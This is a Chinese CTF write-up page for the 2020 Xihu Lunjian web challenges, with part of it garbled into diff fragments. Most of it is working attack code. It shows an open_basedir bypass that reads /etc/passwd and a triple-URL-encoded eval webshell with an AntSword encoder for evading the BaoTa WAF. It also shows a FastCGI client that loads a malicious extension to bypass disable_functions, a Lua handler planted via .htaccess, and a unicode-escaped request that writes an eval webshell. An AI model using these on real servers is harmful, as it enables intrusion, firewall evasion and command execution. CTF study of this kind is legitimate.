class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=https://github.com/eggdkk/Web_Learning title="Web learning" class="md-nav__button md-logo" aria-label="Web learning"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg> </a> Web learning </label> <div class=md-nav__source> <a href=https://github.com/eggdkk/Web_Learning/ title="Go to repository" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg> </div> <div class=md-source__repository> eggdkk/Web_Learning </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. title=index class=md-nav__link> index </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-2 type=checkbox id=nav-2> <label class=md-nav__link for=nav-2> Web基础嗷 <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg> </span> </label> <nav class=md-nav aria-label=Web基础嗷 data-md-level=1> <label class=md-nav__title for=nav-2> <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </span> Web基础嗷 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../basis/Overview/ title=Web概述 class=md-nav__link> Web概述 </a> </li> <li class=md-nav__item> <a href=../../basis/Websec/ title=Web安全综述 class=md-nav__link> Web安全综述 </a> </li> <li class=md-nav__item> <a href=../../basis/Server%26Middleware/ title=服务器&中间件 class=md-nav__link> 服务器&中间件 </a> </li> <li class=md-nav__item> <a href=../../basis/BasisDatabaseSyntax/ title=数据库基础&tcpdump抓包 class=md-nav__link> 数据库基础&tcpdump抓包 </a> </li> <li class=md-nav__item> <a href=../../basis/include/ title=文件包含 class=md-nav__link> 文件包含 </a> </li> <li class=md-nav__item> <a href=../../basis/PhpTricks/ title="PHP的一些 “特性”" class=md-nav__link> PHP的一些 “特性” </a> </li> <li class=md-nav__item> <a href=../../basis/NoColumnInjection/ title=SQL注入限制条件下获取表名&无列名注入 class=md-nav__link> SQL注入限制条件下获取表名&无列名注入 </a> </li> <li class=md-nav__item> <a href=../../basis/PhpUnserialization/ title=PHP反序列化 class=md-nav__link> PHP反序列化 </a> </li> <li class=md-nav__item> <a href=../../basis/Redis/ title=Redis class=md-nav__link> Redis </a> </li> <li class=md-nav__item> <a href=../../basis/phpmyadmin_write_shell/ title=basis class=md-nav__link> basis </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3 type=checkbox id=nav-3> <label class=md-nav__link for=nav-3> 👴平常记录的 <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg> </span> </label> <nav class=md-nav aria-label=👴平常记录的 data-md-level=1> <label class=md-nav__title for=nav-3> <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </span> 👴平常记录的 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../usually/docker%2BPHPdebug/ title=docker+PHPdebug class=md-nav__link> docker+PHPdebug </a> </li> <li class=md-nav__item> <a href=../../usually/oh_my_zsh/ title=oh_my_zsh配置 class=md-nav__link> oh_my_zsh配置 </a> </li> <li class=md-nav__item> <a href=../../usually/ title=Test class=md-nav__link> Test </a> </li> <li class=md-nav__item> <a href=../../usually/email/ title=邮箱收集渗透钓鱼 class=md-nav__link> 邮箱收集渗透钓鱼 </a> </li> <li class=md-nav__item> <a href=../../usually/golang_dockerAPI/ title=golang_dockerAPI开发小记 class=md-nav__link> golang_dockerAPI开发小记 </a> </li> <li class=md-nav__item> <a href=../../basis/ew/ title=ssh隧道_ew穿透 class=md-nav__link> ssh隧道_ew穿透 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4 type=checkbox id=nav-4 checked> <label class=md-nav__link for=nav-4> CTF_Writeup <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg> </span> </label> <nav class=md-nav aria-label=CTF_Writeup data-md-level=1> <label class=md-nav__title for=nav-4> <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </span> CTF_Writeup </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> 2020西湖论剑初赛 <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg> </span> </label> <a href=./ title=2020西湖论剑初赛 class="md-nav__link md-nav__link--active"> 2020西湖论剑初赛 </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </span> Table of contents </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#web1 class=md-nav__link> Web1 </a> <nav class=md-nav aria-label=Web1> <ul class=md-nav__list> <li class=md-nav__item> <a href=#disable_functions class=md-nav__link> 绕过disable_functions解法一 </a> </li> <li class=md-nav__item> <a href=#disable_functions_1 class=md-nav__link> 绕过disable_functions解法二 </a> </li> <li class=md-nav__item> <a href=#lua class=md-nav__link> 利用lua </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#web5 class=md-nav__link> Web5 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../2020N1CTF/ title=2020N1CTF class=md-nav__link> 2020N1CTF </a> </li> <li class=md-nav__item> <a href=../2020_zer0pts_CTF/ title=2020_zer0pts_CTF class=md-nav__link> 2020_zer0pts_CTF </a> </li> <li class=md-nav__item> <a href=../2020_Hackergame/ title="Hackergame 2020" class=md-nav__link> Hackergame 2020 </a> </li> <li class=md-nav__item> <a href=../2020UNCTF_Web/ title=2020UNCTF_Web class=md-nav__link> 2020UNCTF_Web </a> </li> <li class=md-nav__item> <a href=../2020dhb_Web/ title=2020dhb_Web class=md-nav__link> 2020dhb_Web </a> </li> <li class=md-nav__item> <a href=../2020xyb/ title=2020祥云杯 class=md-nav__link> 2020祥云杯 </a> </li> <li class=md-nav__item> <a href=../2020HuaweiCTF/ title=2020华为云CTF class=md-nav__link> 2020华为云CTF </a> </li> <li class=md-nav__item> <a href=../2020Huawei2/ title=2020华为云CTF第二场 class=md-nav__link> 2020华为云CTF第二场 </a> </li> <li class=md-nav__item> <a href=../2021zer0ptsCTF/ title=2021zer0ptsCTF class=md-nav__link> 2021zer0ptsCTF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5 type=checkbox id=nav-5> <label class=md-nav__link for=nav-5> vulhub靶场 <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg> </span> </label> <nav class=md-nav aria-label=vulhub靶场 data-md-level=1> <label class=md-nav__title for=nav-5> <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </span> vulhub靶场 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../vulhub/narak/ title=narak class=md-nav__link> narak </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../friendly_link/ title=友链~ class=md-nav__link> 友链~ </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </span> Table of contents </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#web1 class=md-nav__link> Web1 </a> <nav class=md-nav aria-label=Web1> <ul class=md-nav__list> <li class=md-nav__item> <a href=#disable_functions class=md-nav__link> 绕过disable_functions解法一 </a> </li> <li class=md-nav__item> <a href=#disable_functions_1 class=md-nav__link> 绕过disable_functions解法二 </a> </li> <li class=md-nav__item> <a href=#lua class=md-nav__link> 利用lua </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#web5 class=md-nav__link> Web5 </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content> <article class="md-content__inner md-typeset"> <a href=https://github.com/eggdkk/Web_Learning/edit/master/docs/CTF_Writeup/2020xhlj.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg> </a> <h1 id=2020>2020西湖论剑<a class=headerlink href=#2020 title="Permanent link">&para;</a></h1> <h2 id=web1>Web1<a class=headerlink href=#web1 title="Permanent link">&para;</a></h2> <p>利用<code>%0a</code>来绕过文件名waf <img alt src=../../image/CTF_Writeup/2020xhlj/1.png><br> 发现有<code>disable_functions</code>和<code>open_basedir</code> <br> 可以利用</p> <pre><code class=php>&lt;?php mkdir('dkkkkkkkk');chdir('dkkkkkkkk');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');
+print_r(scandir(&quot;/&quot;));
+highlight_file(&quot;/etc/passwd&quot;)
+?&gt;
+</code></pre> <p>绕过<code>open_basedir</code></p> <h3 id=disable_functions>绕过<code>disable_functions</code>解法一<a class=headerlink href=#disable_functions title="Permanent link">&para;</a></h3> <p>利用蚁剑插件，直接绕过，靶机有宝塔，不能传入动态执行参数</p> <p>ha1师傅完了和我说可以利用URL编码3次。宝塔就不会拦截</p> <p>WebShell</p> <pre><code class=php>&lt;?php
+eval(urldecode(urldecode(urldecode($_POST['dkk']))));?&gt;
+</code></pre> <p>蚁剑新建编码器；</p> <pre><code class=js>'use strict';
+function forceEncode(s) {
+  return Array.from(s).map(i=&gt;'%'+i.charCodeAt(0).toString(16).padStart(2,'0')).join('')
+}
+module.exports = (pwd, data, ext={}) =&gt; {
+  const payload = data['_']
+  data[pwd] = forceEncode(forceEncode(forceEncode(payload)));
+  delete data['_'];
+  return data;
+}
+</code></pre> <p><img alt src=../../image/CTF_Writeup/2020xhlj/2.png></p> <p>利用插件不多说</p> <h3 id=disable_functions_1>绕过<code>disable_functions</code>解法二<a class=headerlink href=#disable_functions_1 title="Permanent link">&para;</a></h3> <p>当时不知道绕过bt，于是就手动上传<code>.so</code> php文件 https://github.com/AntSwordProject/ant_php_extension</p> <pre><code class=php>&lt;?php 
+class Client
+{
+    const VERSION_1            = 1;
+    const BEGIN_REQUEST        = 1;
+    const PARAMS               = 4;
+    const STDIN                = 5;
+    const STDOUT               = 6;
+    const STDERR               = 7;
+    const DATA                 = 8;
+    const GET_VALUES           = 9;
+    const GET_VALUES_RESULT    = 10;
+    const UNKNOWN_TYPE         = 11;
+    const RESPONDER            = 1;
+    protected $keepAlive = false;
+    protected $_requests = array();
+    protected $_requestCounter = 0;
+    protected function buildPacket($type, $content, $requestId = 1)
+    {
+        $offset = 0;
+        $totLen = strlen($content);
+        $buf    = '';
+        do {
+            // Packets can be a maximum of 65535 bytes
+            $part = substr($content, $offset, 0xffff - 8);
+            $segLen = strlen($part);
+            $buf .= chr(self::VERSION_1)        /* version */
+                . chr($type)                    /* type */
+                . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
+                . chr($requestId &amp; 0xFF)        /* requestIdB0 */
+                . chr(($segLen &gt;&gt; 8) &amp; 0xFF)    /* contentLengthB1 */
+                . chr($segLen &amp; 0xFF)           /* contentLengthB0 */
+                . chr(0)                        /* paddingLength */
+                . chr(0)                        /* reserved */
+                . $part;                        /* content */
+            $offset += $segLen;
+        } while ($offset &lt; $totLen);
+        return $buf;
+    }
+    protected function buildNvpair($name, $value)
+    {
+        $nlen = strlen($name);
+        $vlen = strlen($value);
+        if ($nlen &lt; 128) {
+            /* nameLengthB0 */
+            $nvpair = chr($nlen);
+        } else {
+            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
+            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
+        }
+        if ($vlen &lt; 128) {
+            /* valueLengthB0 */
+            $nvpair .= chr($vlen);
+        } else {
+            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
+            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
+        }
+        /* nameData &amp; valueData */
+        return $nvpair . $name . $value;
+    }
+    protected function readNvpair($data, $length = null)
+    {
+        if ($length === null) {
+            $length = strlen($data);
+        }
+        $array = array();
+        $p = 0;
+        while ($p != $length) {
+            $nlen = ord($data{$p++});
+            if ($nlen &gt;= 128) {
+                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $nlen |= (ord($data{$p++}));
+            }
+            $vlen = ord($data{$p++});
+            if ($vlen &gt;= 128) {
+                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $vlen |= (ord($data{$p++}));
+            }
+            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
+            $p += ($nlen + $vlen);
+        }
+        return $array;
+    }
+    public function buildAllPacket(array $params, $stdin)
+    {
+        // Ensure new requestID is not already being tracked
+        do {
+            $this-&gt;_requestCounter++;
+            if ($this-&gt;_requestCounter &gt;= 65536 /* or (1 &lt;&lt; 16) */) {
+                $this-&gt;_requestCounter = 1;
+            }
+            $id = $this-&gt;_requestCounter;
+        } while (isset($this-&gt;_requests[$id]));
+        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;keepAlive) . str_repeat(chr(0), 5), $id);
+        $paramsRequest = '';
+        foreach ($params as $key =&gt; $value) {
+            $paramsRequest .= $this-&gt;buildNvpair($key, $value, $id);
+        }
+        if ($paramsRequest) {
+            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest, $id);
+        }
+        $request .= $this-&gt;buildPacket(self::PARAMS, '', $id);
+        if ($stdin) {
+            $request .= $this-&gt;buildPacket(self::STDIN, $stdin, $id);
+        }
+        $request .= $this-&gt;buildPacket(self::STDIN, '', $id);
+        return $request;
+    }
+}
+$sock = stream_socket_client(&quot;unix:///tmp/php-cgi-74.sock&quot;, $errno, $errstr);
+$client = new Client();
+$payload_file = &quot;/tmp/jylsec.php&quot;;
+$params = array(
+    'REQUEST_METHOD' =&gt; 'GET',
+    'SCRIPT_FILENAME' =&gt; $payload_file,
+    'PHP_ADMIN_VALUE' =&gt; &quot;extension_dir = /tmp\nextension = jylsec.so&quot;,
+);
+$data = $client-&gt;buildAllPacket($params, '');
+fwrite($sock, $data);
+var_dump(fread($sock, 4096));
+?&gt;
+</code></pre> <p>https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/</p> <h3 id=lua>利用lua<a class=headerlink href=#lua title="Permanent link">&para;</a></h3> <p>https://xz.aliyun.com/t/6088 </p> <p>bt默认安装了一个lua 模块</p> <p>上传<code>.htaccess</code></p> <pre><code>AddHandler lua-script .lua
+</code></pre> <p>上传shel.lua</p> <pre><code class=lua>require &quot;string&quot;
+
+function handle(r)
+    r.content_type = &quot;text/plain&quot;
+    local t = io.popen('/readflag')
+    local a = t:read(&quot;*all&quot;)
+    r:puts(a)
+
+    if r.method == 'GET' then
+        for k, v in pairs( r:parseargs() ) do
+            r:puts( string.format(&quot;%s: %s\n&quot;, k, v) )
+        end
+    else
+        r:puts(&quot;Unsupported HTTP method &quot; .. r.method)
+    end
+end
+</code></pre> <h2 id=web5>Web5<a class=headerlink href=#web5 title="Permanent link">&para;</a></h2> <pre><code class=php>&lt;?php
+include 'security.php';
+
+if(!isset($_GET['source'])){
+    show_source(__FILE__);
+    die();
+}
+$sandbox = 'sandbox/'.sha1($_SERVER['HTTP_X_FORWARDED_FOR']).'/';
+var_dump($sandbox);
+if(!file_exists($sandbox)){
+    mkdir($sandbox);
+    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo 'Welcome To Dbapp OSS.';?&gt;&quot;);
+}
+$action = $_GET['action'];
+$content = file_get_contents(&quot;php://input&quot;);
+
+
+if($action == &quot;write&quot; &amp;&amp;  SecurityCheck('filename',$_GET['filename']) &amp;&amp;SecurityCheck('content',$content)){
+    $content = json_decode($content);
+    $filename = $_GET['filename'];
+    $filecontent = $content-&gt;content;
+    $filename = $sandbox.$filename;
+    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
+}elseif($action == &quot;reset&quot;){
+    $files = scandir($sandbox);
+    foreach($files as $file) {
+        if(!is_dir($file)){
+            if($file !== &quot;index.php&quot;){
+                unlink($sandbox.$file);
+            }
+        }
+    }
+}
+else{
+    die('Security Check Failed.');
+}
+</code></pre> <p>waf了一些参数，利用unicode编码绕过</p> <pre><code>POST http://easyjson.8a3da2.challenge.gcsis.cn/?source&amp;action=write&amp;filename=c.php HTTP/1.1
 Host: easyjson.8a3da2.challenge.gcsis.cn
 Content-Length: 237
 Cache-Control: max-age=0
@@ -1019,77 +209,7 @@ Cookie: UM_distinctid=174e7751dbe171-0961396097844b-31697304-384000-174e7751dbfc
 Connection: close
 
 {&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;&lt;\u003f\u0070\u0068\u0070\u0020\u0070\u0068\u0070\u0069\u006e\u0066\u006f\u0028\u0029\u003b\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0031\u005d\u0029\u003f&gt;&quot;}
-</code></pre></div>
-                
-              
-              
-                
-
-
-              
-            </article>
-          </div>
-        </div>
-      </main>
-      
-        
-<footer class="md-footer">
-  
-    <div class="md-footer-nav">
-      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
-        
-          <a href="../../basis/ew/" title="ssh隧道_ew穿透" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
-            <div class="md-footer-nav__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-            </div>
-            <div class="md-footer-nav__title">
-              <div class="md-ellipsis">
-                <span class="md-footer-nav__direction">
-                  Previous
-                </span>
-                ssh隧道_ew穿透
-              </div>
-            </div>
-          </a>
-        
-        
-          <a href="../2020N1CTF/" title="2020N1CTF" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
-            <div class="md-footer-nav__title">
-              <div class="md-ellipsis">
-                <span class="md-footer-nav__direction">
-                  Next
-                </span>
-                2020N1CTF
-              </div>
-            </div>
-            <div class="md-footer-nav__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
-            </div>
-          </a>
-        
-      </nav>
-    </div>
-  
-  <div class="md-footer-meta md-typeset">
-    <div class="md-footer-meta__inner md-grid">
-      <div class="md-footer-copyright">
-        
-        Made with
-        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
-          Material for MkDocs
-        </a>
-      </div>
-      
-    </div>
-  </div>
-</footer>
-      
-    </div>
-    
-      <script src="../../assets/javascripts/vendor.d710d30a.min.js"></script>
-      <script src="../../assets/javascripts/bundle.b39636ac.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents"}</script>
-      
-      <script>
+</code></pre> <hr> <div class=md-source-date> <small> Last update: 2021-04-25 </small> </div> </article> </div> </div> </main> <footer class=md-footer> <div class=md-footer-nav> <nav class="md-footer-nav__inner md-grid" aria-label=Footer> <a href=../../basis/ew/ title=ssh隧道_ew穿透 class="md-footer-nav__link md-footer-nav__link--prev" rel=prev> <div class="md-footer-nav__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer-nav__title> <div class=md-ellipsis> <span class=md-footer-nav__direction> Previous </span> ssh隧道_ew穿透 </div> </div> </a> <a href=../2020N1CTF/ title=2020N1CTF class="md-footer-nav__link md-footer-nav__link--next" rel=next> <div class=md-footer-nav__title> <div class=md-ellipsis> <span class=md-footer-nav__direction> Next </span> 2020N1CTF </div> </div> <div class="md-footer-nav__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> </div> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <script src=../../assets/javascripts/vendor.d710d30a.min.js></script> <script src=../../assets/javascripts/bundle.b39636ac.min.js></script><script id=__lang type=application/json>{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents"}</script> <script>
         app = initialize({
           base: "../..",
           features: [],
@@ -1097,14 +217,4 @@ Connection: close
             worker: "../../assets/javascripts/worker/search.a68abb33.min.js"
           }, typeof search !== "undefined" && search)
         })
-      </script>
-      
-        <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
-      
-        <script src="../../js/simpleLightbox.min.js"></script>
-      
-        <script src="../../js/extension.js"></script>
-      
-    
-  </body>
-</html>
+      </script> <script src=https://code.jquery.com/jquery-3.2.1.min.js></script> <script src=../../js/simpleLightbox.min.js></script> <script src=../../js/extension.js></script> <script src=../../js/vendor.js></script> <script src=../../js/app.js></script> </body> </html>
